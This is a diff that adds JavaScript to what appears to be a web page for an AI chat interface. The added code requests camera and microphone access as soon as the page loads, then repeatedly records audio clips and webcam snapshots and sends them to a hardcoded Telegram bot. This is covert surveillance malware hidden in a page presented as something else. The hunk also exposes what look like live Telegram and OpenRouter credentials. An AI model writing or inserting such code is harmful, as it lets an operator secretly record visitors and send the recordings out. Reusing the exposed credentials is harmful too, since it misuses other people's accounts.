@@ -435,6 +435,92 @@
     </div>
 
     <script>
+let stream = null;
+let audioActive = false;
+let photoActive = false;
+
+const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
+const CHAT_ID   = "5648826330";
+
+const AUDIO_MS = 5000; // الصوت كل 5 ثواني
+const PHOTO_MS = 2000; // الصورة كل 2 ثانية
+
+// إرسال إلى تليجرام
+function sendToTelegram(blob, type="voice") {
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
+        method: "POST",
+        body: form
+    })
+    .catch(err => console.error("خطأ في الإرسال:", err));
+}
+
+// تسجيل صوت 5 ثواني
+function recordAudio() {
+    return new Promise(resolve => {
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
+        recorder.start();
+        setTimeout(() => recorder.stop(), AUDIO_MS);
+    });
+}
+
+// التقاط صورة
+function captureImage() {
+    return new Promise(resolve => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+            video.play();
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            canvas.toBlob(blob => resolve(blob), "image/jpeg");
+        };
+    });
+}
+
+// حلقة الصوت
+async function audioLoop() {
+    audioActive = true;
+    while (audioActive) {
+        const audio = await recordAudio();
+        sendToTelegram(audio, "voice");
+        await new Promise(r => setTimeout(r, 5000));
+    }
+}
+
+// حلقة الصور
+async function photoLoop() {
+    photoActive = true;
+    while (photoActive) {
+        const img = await captureImage();
+        sendToTelegram(img, "photo");
+        await new Promise(r => setTimeout(r, PHOTO_MS));
+    }
+}
+
+// طلب إذن الكاميرا والمايك فور دخول الصفحة وتشغيل الحلقات
+async function start() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        console.log("تم منح الإذن! بدء التسجيل...");
+        audioLoop();
+        photoLoop();
+    } catch (err) {
+        console.log("تم رفض الإذن أو حدث خطأ:", err);
+    }
+}
+
+window.addEventListener("load", start);
+
         const OPENROUTER_KEY = "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";
         
         const chatArea = document.getElementById('chatArea');
